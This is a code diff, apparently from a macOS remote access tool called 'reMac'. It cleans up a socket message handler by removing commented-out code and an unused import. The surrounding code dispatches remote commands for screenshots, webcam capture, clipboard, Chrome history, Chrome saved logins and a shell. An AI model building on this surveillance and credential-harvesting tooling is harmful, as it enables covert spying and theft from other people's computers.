@@ -7,7 +7,6 @@ import selectors
 import json
 import io
 import struct
-import subprocess
 
 from modules import mod_hello
 from modules import mod_clipboard
@@ -26,16 +25,6 @@ reMacModules = {
     'sc': mod_screenshot.mod_screenshot(),
     'wc': mod_webcam.mod_webcam()
 }
-
-# request_search = {
-#     "morpheus": "Follow the white rabbit. \U0001f430",
-#     "ring": "In the caves beneath the Misty Mountains. \U0001f48d",
-#     "\U0001f436": "\U0001f43e Playing ball! \U0001f3d0",
-# }
-
-# def run_command(command):
-#     out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
-#     return out + err
 
 class Message:
     def __init__(self, selector, sock, addr):
@@ -110,14 +99,6 @@ class Message:
                 or input == "cb" \
                 or input == "ch":  # or input == "help":
             return reMacModules[input].run_mod()
-        # elif input == "s":  # or input == "help":
-        #     myreMac_server.start_server()
-        # elif input == "c":  # or input == "help":
-        #     myreMac_client.start_client()
-        # elif input == "cb":  # or input == "clipboard":
-        #     return reMacModules[input].run_mod()
-        # elif input == "ch":  # or input == "chromeHistory":
-        #     reMacModules[input].run_mod()
         elif input == "cl":  # or input == "chromeLogins":
             reMacModules[input].run_mod()
         elif input == "sh":  # or input == "shell":
@@ -148,10 +129,6 @@ class Message:
 
     def _create_response_json_content(self):
         action = self.request.get("action")
-        # if action == "search":
-        #     query = self.request.get("value")
-        #     answer = request_search.get(query) or f'No match for "{query}".'
-        #     content = {"action": action, "result": answer}
         if action == "helloWorld":
             answer = self.processInput(action) #f'HelloWorld action called!!!'
             content = {"action": action, "result": answer}
